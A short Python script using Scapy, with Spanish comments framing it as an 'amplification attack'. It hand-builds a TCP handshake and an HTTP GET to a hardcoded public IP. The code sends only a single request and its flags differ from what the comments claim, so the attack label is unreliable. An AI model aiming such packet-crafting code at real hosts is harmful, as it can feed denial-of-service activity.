# Ataque amplificacion enviando una peticion http y flags TCP: SYN + ACK:PSH
# Peticion HTTP GET, con handshake TCP, em 3 solo pasos. Flags TCP: SYN + ACK:PSH
# hackingyseguridad.com 2023

import sys
import socket
from scapy.all import *

# SYN
ip=IP(dst="104.16.88.120")
SYN=TCP( dport=80, flags='S', seq=1000)
SYNACK=sr1(ip/SYN)

# ACK
ACK=TCP(dport=80, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
send(ip/ACK)

# GET request
req =  "GET / HTTP/1.1\r\n"
# Other headers ...
req += "\r\n"

DATA = TCP(dport=80, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)/req
ANS = sr1(DATA) # this is probably going to be only an ACK segment, next one should be your HTTP response
